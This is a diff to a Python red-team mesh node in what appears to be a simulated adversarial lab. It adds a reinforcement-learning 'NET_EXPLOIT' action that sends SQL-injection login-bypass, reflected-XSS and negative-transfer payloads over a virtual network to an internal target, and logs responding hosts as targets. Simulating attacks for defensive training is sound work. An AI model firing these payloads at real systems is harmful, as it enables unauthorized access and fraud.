@@ -14,6 +14,8 @@ import secrets
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 import config
 import utils
+from vnet.nic import VNic
+from vnet.protocol import MSG_DATA
 
 # Configuration
 MCAST_GRP = '224.1.1.1'
@@ -38,7 +40,11 @@ class RedMeshNode:
         }
 
         # RL Brain (Adversarial)
-        self.brain = utils.RLBrain(f"RedNode-{NODE_ID}", ["POLYMORPH", "STEGO", "FLOOD_C2", "FUZZ_BLUE"])
+        self.brain = utils.RLBrain(f"RedNode-{NODE_ID}", ["POLYMORPH", "STEGO", "FLOOD_C2", "FUZZ_BLUE", "NET_EXPLOIT"])
+
+        # Virtual Network
+        self.nic = VNic(f"10.0.{random.randint(20,200)}.{random.randint(2,254)}")
+        self.known_targets = set()
 
     def get_state(self):
         # Quantize state: (PeerCount_Bucket, Success_Bool)
@@ -66,6 +72,50 @@ class RedMeshNode:
         # Sender socket
         self.sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         self.sender.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
+
+    def start_network_ops(self):
+        """Connect to VNet and start operations."""
+        if self.nic.connect():
+            logger.info(f"Connected to VNet as {self.nic.ip}")
+            t = threading.Thread(target=self.network_listener, daemon=True)
+            t.start()
+        else:
+            logger.warning("VNet connection failed.")
+
+    def network_listener(self):
+        while self.running and self.nic.connected:
+            msg = self.nic.recv()
+            if msg:
+                # Analyze responses for recon
+                src = msg.get('src')
+                payload = msg.get('payload', {})
+                if "status" in payload:
+                    logger.info(f"VNet Response from {src}: {payload}")
+                    if payload.get('status') == 200:
+                        self.known_targets.add(src)
+
+    def net_exploit(self):
+        """Launch attacks via VNet."""
+        target = "10.10.10.10" # Static for now, or use discovered targets
+
+        attacks = [
+            # SQL Injection
+            {"path": "/login", "data": {"username": "admin' OR '1'='1", "password": "x"}, "desc": "SQLi Login Bypass"},
+            # XSS
+            {"path": "/search_user", "data": {"q": "<script>alert(1)</script>"}, "desc": "Reflected XSS"},
+            # Business Logic
+            {"path": "/transfer", "data": {"amount": "-500"}, "desc": "Negative Transfer"}
+        ]
+
+        attack = random.choice(attacks)
+        payload = {
+            "method": "POST",
+            "path": attack['path'],
+            "data": attack['data']
+        }
+
+        logger.info(f"🚀 LAUNCHING NET EXPLOIT: {attack['desc']} -> {target}")
+        self.nic.send(target, payload)
 
     def broadcast(self, msg_type, payload):
         """Send message to mesh."""
@@ -237,6 +287,7 @@ class RedMeshNode:
         logger.info(f"Red Mesh Node {NODE_ID} coming online...")
         utils.enforce_seccomp() # Hardening
         self.setup_multicast()
+        self.start_network_ops()
 
         t = threading.Thread(target=self.listener)
         t.daemon = True
@@ -263,6 +314,9 @@ class RedMeshNode:
             elif action == "FUZZ_BLUE":
                 self.launch_assault()
                 reward = 10 # High reward for aggression
+            elif action == "NET_EXPLOIT":
+                self.net_exploit()
+                reward = 15
 
             # Check survival (Simplistic reward)
             reward += 1
